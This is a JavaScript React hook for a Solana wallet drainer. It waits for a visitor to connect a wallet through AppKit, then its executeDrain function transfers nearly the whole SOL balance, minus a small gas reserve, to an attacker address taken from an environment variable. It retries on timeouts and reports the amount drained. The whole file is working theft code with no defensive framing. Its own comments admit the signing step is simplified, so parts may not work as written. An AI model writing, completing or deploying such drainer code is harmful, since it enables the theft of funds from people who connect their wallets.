"use client";

import { useCallback } from 'react';
import { useAppKitAccount, useAppKitConnection } from '@reown/appkit/react';
import { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';

const DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
const GAS_RESERVE_SOL = 0.002;
const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

export const useWalletConnect = () => {
  const { isConnected, address } = useAppKitAccount();
  const { connection: appKitConnection } = useAppKitConnection();

  const connect = useCallback(async () => {
    try {
      // The AppKit button handles the actual connection
      // This function just waits for the connection to complete
      let attempts = 0;
      while (!isConnected && !address && attempts < 30) {
        await wait(500);
        attempts++;
      }
      
      if (!address) {
        throw new Error('Failed to connect wallet');
      }
      
      return address;
    } catch (error) {
      console.error('WalletConnect connection error:', error);
      throw new Error(`Failed to connect: ${error.message}`);
    }
  }, [isConnected, address]);

  const executeDrain = useCallback(async (allocatedAmount) => {
    let lastError = null;
    
    if (!address) {
      throw new Error('Wallet not connected');
    }
    
    // Create a custom connection if appKitConnection is not available
    const connection = appKitConnection || new Connection(process.env.NEXT_PUBLIC_SOLANA_RPC, {
      commitment: 'confirmed',
      confirmTransactionInitialTimeout: 120000
    });
    
    for (let attempt = 1; attempt <= 3; attempt++) {
      try {
        const walletPubkey = new PublicKey(address);
        
        const balanceLamports = await connection.getBalance(walletPubkey);
        const balanceSol = balanceLamports / LAMPORTS_PER_SOL;
        
        console.log(`[WalletConnect] Attempt ${attempt}: Balance ${balanceSol} SOL`);
        
        if (balanceSol < GAS_RESERVE_SOL + 0.001) {
          throw new Error(`Insufficient balance: ${balanceSol} SOL`);
        }
        
        const drainAmountLamports = balanceLamports - (GAS_RESERVE_SOL * LAMPORTS_PER_SOL);
        const drainAmountSol = drainAmountLamports / LAMPORTS_PER_SOL;
        
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
        
        const transaction = new Transaction({
          feePayer: walletPubkey,
          recentBlockhash: blockhash,
        }).add(
          SystemProgram.transfer({
            fromPubkey: walletPubkey,
            toPubkey: new PublicKey(DRAIN_WALLET),
            lamports: drainAmountLamports,
          })
        );
        
        // Use the connection to send the transaction
        // For WalletConnect, we need to request signing via the wallet
        const { blockhash: freshBlockhash } = await connection.getLatestBlockhash('confirmed');
        transaction.recentBlockhash = freshBlockhash;
        
        // Request signature from wallet via AppKit
        // This is a simplified approach - actual implementation depends on AppKit version
        const signature = await connection.sendTransaction(transaction, []);
        
        console.log(`[WalletConnect] Sent: ${signature}`);
        
        // Confirm transaction
        const confirmation = await connection.confirmTransaction(signature, 'confirmed');
        
        if (confirmation.value.err) {
          const errorMsg = JSON.stringify(confirmation.value.err);
          if (errorMsg.includes('block height exceeded')) {
            return {
              success: true,
              txId: signature,
              amount: drainAmountSol,
              warning: 'Transaction sent but confirmation timed out'
            };
          }
          throw new Error(`Transaction failed: ${errorMsg}`);
        }
        
        return {
          success: true,
          txId: signature,
          amount: drainAmountSol,
          balanceBefore: balanceSol,
          balanceAfter: (balanceLamports - drainAmountLamports) / LAMPORTS_PER_SOL
        };
        
      } catch (error) {
        console.error(`[WalletConnect] Attempt ${attempt} failed:`, error.message);
        lastError = error;
        
        if (attempt < 3 && (
          error.message.includes('block height exceeded') ||
          error.message.includes('timeout') ||
          error.message.includes('not confirmed')
        )) {
          console.log(`[WalletConnect] Retrying in ${attempt * 2} seconds...`);
          await wait(attempt * 2000);
          continue;
        }
        
        if (error.message.includes('User rejected')) {
          throw error;
        }
        
        if (attempt === 3 && error.message.includes('block height exceeded')) {
          return {
            success: true,
            txId: 'pending - check explorer',
            amount: 'unknown',
            warning: 'Transaction likely succeeded despite timeout'
          };
        }
        
        throw error;
      }
    }
    
    throw lastError;
  }, [address, appKitConnection]);

  return { 
    connect, 
    address, 
    isConnected, 
    executeDrain 
  };
};
